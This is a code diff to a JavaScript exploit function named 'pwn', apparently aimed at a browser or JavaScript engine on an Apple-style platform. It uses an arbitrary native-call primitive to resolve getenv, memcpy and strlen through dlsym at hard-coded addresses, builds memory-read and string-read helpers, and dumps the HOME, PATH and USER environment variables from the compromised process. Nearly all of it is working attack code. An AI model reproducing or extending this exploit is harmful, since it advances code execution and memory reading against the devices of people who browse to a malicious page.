@@ -405,7 +405,7 @@ function pwn() {
             log("[+] Only 9 args are allowed!\n");
             return -1;
         }
-        log(`[+] func: 0x${func.toString(16)}`);
+        //log(`[+] func: 0x${func.toString(16)}`);
         arrayView.setBigUint64(0x0, BigInt(func), true);
         for (let i = 0; i < args.length; i++) {
             let arg = args[i];
@@ -428,25 +428,39 @@ function pwn() {
         return arrayView.getBigUint64(0x8, true);
     }
     
+    let dlsymAddr = 0x18039e2b8;
+    let getenvAddr = arbCall(dlsymAddr, -2, "getenv");
+    let memcpyAddr = arbCall(dlsymAddr, -2, "memcpy");
+    let strlenAddr = arbCall(dlsymAddr, -2, "strlen");
+    
+    log(`[+] dlsym address: 0x${dlsymAddr.toString(16)}`);
+    log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
+    log(`[+] memcpy address: 0x${memcpyAddr.toString(16)}`);
+    log(`[+] strlen address: 0x${strlenAddr.toString(16)}`);
+    
     function readbuf(addr, size) {
         let uint8Array = new Uint8Array(size);
-        arbCall(0x1daf7a820, uint8Array, addr, size); // memcpy
+        arbCall(memcpyAddr, uint8Array, addr, size);
         return uint8Array;
     }
     
+    function strlen(string) {
+        return Number(arbCall(strlenAddr, string));
+    }
     
-    // call dlsym
-    let getenvAddr = arbCall(0x18039e2b8, -2, "getenv");
-    log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
+    function readString(stringAddr) {
+        if (stringAddr == 0) return "";
+        let stringBytes = readbuf(stringAddr, strlen(stringAddr));
+        return new TextDecoder('utf-8').decode(stringBytes);
+    }
     
-    let homeStringAddr = arbCall(getenvAddr, "HOME");
-    log(`[+] home string address: 0x${homeStringAddr.toString(16)}`);
+    function getenv(name) {
+        return readString(arbCall(getenvAddr, name));
+    }
     
-    let homeStringLen = arbCall(0x1daf7af20, homeStringAddr);
-    let homeStringBytes = readbuf(homeStringAddr, Number(homeStringLen));
-    let homeString = new TextDecoder('utf-8').decode(homeStringBytes);
-    
-    log(`[+] HOME: ${homeString}`);
+    log(`[+] HOME: ${getenv("HOME")}`);
+    log(`[+] PATH: ${getenv("PATH")}`);
+    log(`[+] USER: ${getenv("USER")}`);
 }
 
 function logBytes(array) {
